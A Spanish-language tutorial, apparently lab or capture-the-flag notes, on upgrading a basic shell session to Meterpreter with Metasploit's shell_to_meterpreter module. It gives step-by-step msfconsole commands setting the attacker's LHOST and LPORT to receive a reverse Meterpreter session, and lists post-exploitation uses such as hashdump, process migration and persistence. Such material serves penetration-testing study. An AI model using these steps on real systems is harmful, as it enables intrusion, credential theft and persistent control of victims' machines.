# De Shell Normal a Session Meterpreter con `multi/manage/shell_to_meterpreter`

## ¿Qué es una shell "normal"?

Una **shell normal** en Metasploit es una sesión de línea de comandos básica, que no tiene las capacidades avanzadas que ofrece una sesión **Meterpreter**.

Ejemplo de shell básica:

```
C:\Users\victima> whoami
```

Aunque útil, este tipo de acceso es limitado para acciones de post-explotación.

---

## ¿Qué es `multi/manage/shell_to_meterpreter`?

Es un módulo de Metasploit que permite **convertir una sesión de shell estándar** en una sesión **Meterpreter**, aprovechando que ya tienes ejecución de comandos en la máquina víctima.

Este módulo **lanza un payload Meterpreter dentro de la sesión existente**, lo que te da acceso a funcionalidades mucho más completas.

---

## Requisitos

- Tener una **sesión de tipo shell activa** en `msfconsole`.
- Tener configurado un **listener** para recibir la nueva sesión Meterpreter.

---

## Paso a paso

### 1. Verifica tus sesiones

```bash
sessions
```

Busca una sesión tipo "shell", por ejemplo:

```
[*] Active sessions
  Id  Type   Information  Connection
  1   shell  user@host     10.10.14.23:4444 -> 10.10.10.10:1234
```

---

### 2. Usa el módulo `shell_to_meterpreter`

```bash
use multi/manage/shell_to_meterpreter
```

---

### 3. Configura las opciones

```bash
set SESSION 1         # (ID de la sesión shell)
set LHOST <tu_ip>     # (IP del atacante)
set LPORT <puerto>    # (Puerto para recibir la sesión Meterpreter)
```

---

### 4. Ejecuta el módulo

```bash
run
```

---

### 5. Espera la conexión

Si todo funciona correctamente, deberías ver algo como:

```
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Sending stage ...
[*] Meterpreter session 2 opened
```

Verifica con:

```bash
sessions
```

Y verás una nueva sesión Meterpreter activa.

---

## ¿Por qué es útil?

- **Post-explotación avanzada:** te permite acceder a funcionalidades como `getuid`, `migrate`, `hashdump`, `screenshare`, etc.
- **Estabilidad y control:** Meterpreter es más estable que muchas shells básicas.
- **Migración y persistencia:** puedes inyectar el payload en procesos persistentes.

---

## Consideraciones

- El módulo puede fallar si el sistema objetivo tiene antivirus o EDR activos.
- Debes tener privilegios suficientes para lanzar el payload.

